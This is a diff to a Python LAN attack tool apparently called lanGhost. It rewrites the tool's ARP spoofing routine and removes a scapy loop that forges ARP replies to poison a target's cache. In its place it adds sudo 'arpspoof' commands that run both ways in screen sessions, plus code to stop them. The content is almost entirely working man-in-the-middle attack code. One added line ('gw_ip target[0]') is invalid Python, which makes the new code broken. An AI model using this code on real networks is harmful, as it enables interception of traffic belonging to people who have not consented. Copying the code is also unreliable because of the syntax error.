@@ -283,25 +283,12 @@ def subscriptionHandler(bot):
         time.sleep(20)
 
 def arpSpoof(target):
-    global iface_mac
+    global interface
     global gw_ip
-    global gw_mac
     print("[+] ARP Spoofing " + str(target[0]) + "...")
-    from scapy.all import send, ARP
-    while True:
-        if attackManager("isattacked", target=target[0]) == True:
-            i = 0
-            while i < 20:
-                send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), verbose=False)
-                i += 1
-            time.sleep(2)
-        else:
-            print("[+] Stopping ARP Spoof for " + str(target[0]) + "...")
-            i = 0
-            while i < 20:
-                send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), verbose=False)
-                i += 1
-            break
+    gw_ip target[0]
+    os.system("sudo screen -S lanGhost-arp-" + target[0] + "-0 -m -d arpspoof -c " + target[0] + " -t " + gw_ip + " -i " + interface)
+    os.system("sudo screen -S lanGhost-arp-" + target[0] + "-1 -m -d arpspoof -c " + gw_ip + " -t " + target[0] + " -i " + interface)
 
 def mitmHandler(target, ID, bot):
     global admin_chatid
@@ -437,6 +424,11 @@ def stopAttack(ID):
     target = attackManager("gettarget", ID=ID)
 
     attackManager("del", ID=ID)
+
+    if not attackManager("isattacked", target=target):
+        print("[+] Stopping ARP Spoof for " + target + "...")
+        os.system("sudo screen -S lanGhost-arp-" + target + "-0 -X stuff '^C\n'")
+        os.system("sudo screen -S lanGhost-arp-" + target + "-1 -X stuff '^C\n'")
 
     global script_path
     if atype == "kill":
